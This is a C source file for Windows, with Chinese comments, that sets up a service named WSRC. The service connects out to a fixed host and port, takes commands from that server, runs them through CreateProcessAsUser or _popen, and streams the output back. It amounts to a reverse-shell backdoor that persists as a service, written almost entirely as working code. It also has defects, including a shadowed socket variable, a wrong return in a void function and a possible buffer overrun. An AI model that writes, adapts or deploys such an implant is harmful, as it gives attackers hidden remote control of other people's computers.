/*
Made by Q3dlaXpoaQ

Remeber to add this codes in every break:
if (clientSocket != INVALID_SOCKET)
{
    closesocket(clientSocket);
}
g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
// 设置事件，通知服务已经停止
SetEvent(g_ServiceStopEvent);

This can stop the service correctly


*/
#include <stdio.h>
#include <tchar.h>
#include <winsock2.h>
#include <windows.h>
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD controlCode);
void sendChunkedData(SOCKET s, const char *data, int length);
void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command);
void Popen(SOCKET s, const char *command);

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
SOCKET clientSocket;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    g_StatusHandle = RegisterServiceCtrlHandler(TEXT("WSRC"), ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        // 处理注册服务控制处理程序失败的情况
        return;
    }

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (g_ServiceStopEvent == NULL)
    {
        // 处理创建服务停止事件失败的情况
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // 连接到服务器
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "创建套接字时出错\n");
        return 1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7");
    serverAddr.sin_port = htons(8888);

    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        fprintf(stderr, "连接服务器时出错\n");
        closesocket(clientSocket);
        WSACleanup();
        return;
    }
    else
    {
        send(clientSocket, "run", 4, 0);
    }

    // 假设你已经获取了用户的令牌并将其存储在hToken中
    HANDLE hToken;

    char buffer[1024000];
    int bytesReceived;
    while (1)
    {
        bytesReceived = recv(clientSocket, buffer, 1024000, 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
            {
                executeCommandAsUser(clientSocket, hToken, buffer);
                CloseHandle(hToken);
            }
            else
            {
                DWORD error = GetLastError();
                printf("OpenProcessToken failed with error %d\n", error);
            }
        }
        else if (bytesReceived == 0)
        {
            printf("服务器断开连接\n");
            if (clientSocket != INVALID_SOCKET)
            {
                closesocket(clientSocket);
            }
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            // 设置事件，通知服务已经停止
            SetEvent(g_ServiceStopEvent);
            break;
        }
        else
        {
            fprintf(stderr, "接收数据时出错\n");
            if (clientSocket != INVALID_SOCKET)
            {
                closesocket(clientSocket);
            }
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            // 设置事件，通知服务已经停止
            SetEvent(g_ServiceStopEvent);
            break;
        }
    }

    closesocket(clientSocket);

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // 等待服务停止事件被触发
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    WSACleanup(); // 清理Winsock库
}
void WINAPI ServiceCtrlHandler(DWORD controlCode)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        // 添加关闭服务的代码
        if (clientSocket != INVALID_SOCKET)
        {
            closesocket(clientSocket);
        }
        // 设置事件，通知服务已经停止
        SetEvent(g_ServiceStopEvent);

        break;
    }
}
void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
{
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    DWORD bytesRead;
    char buffer[102400];

    ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        fprintf(stderr, "创建管道时出错\n");
        Popen(s, command);
        return;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        fprintf(stderr, "以用户身份创建进程时出错\n");
        Popen(s, command);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    CloseHandle(hWritePipe);

    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
    {
        sendChunkedData(s, buffer, bytesRead);
    }

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
void sendChunkedData(SOCKET s, const char *data, int length)
{
    int totalSent = 0;
    while (totalSent < length)
    {
        int bytesSent = send(s, data + totalSent, length - totalSent, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            fprintf(stderr, "Error sending data\n");
            return;
        }
        totalSent += bytesSent;
    }
}
void Popen(SOCKET s, const char *command)
{
    FILE *fp;
    char buffer[102400];

    if ((fp = _popen(command, "r")) == NULL)
    {
        fprintf(stderr, "执行命令时出错\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL)
    {
        sendChunkedData(s, buffer, strlen(buffer));
    }

    _pclose(fp);
}

void WSRMCmd(const char *command)
{
}

int main()
{
    // 服务安装代码
    SC_HANDLE schSCManager;
    SC_HANDLE schService;

    schSCManager = OpenSCManager(
        NULL,                   // local computer
        NULL,                   // ServicesActive database
        SC_MANAGER_ALL_ACCESS); // full access rights

    schService = OpenService(
        schSCManager,           // SCManager database
        TEXT("WSRC"),           // name of service
        SERVICE_CHANGE_CONFIG); // need change config access

    ChangeServiceConfig(
        schService,           // handle of service
        SERVICE_NO_CHANGE,    // service type: no change
        SERVICE_DEMAND_START, // service start type, changed to manual start
        SERVICE_NO_CHANGE,    // error control type
        NULL,                 // binary path name
        NULL,                 // load order group
        NULL,                 // tag ID
        NULL,                 // dependencies
        NULL,                 // account name
        NULL,                 // password
        NULL);

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    SERVICE_TABLE_ENTRY serviceTable[2];
    TCHAR serviceName[] = _T("MyCmdService");

    serviceTable[0].lpServiceName = serviceName;
    serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    serviceTable[1].lpServiceName = NULL;
    serviceTable[1].lpServiceProc = NULL;

    if (!StartServiceCtrlDispatcher(serviceTable))
    {
        // 处理注册服务失败的情况
    }

    return 0;
}
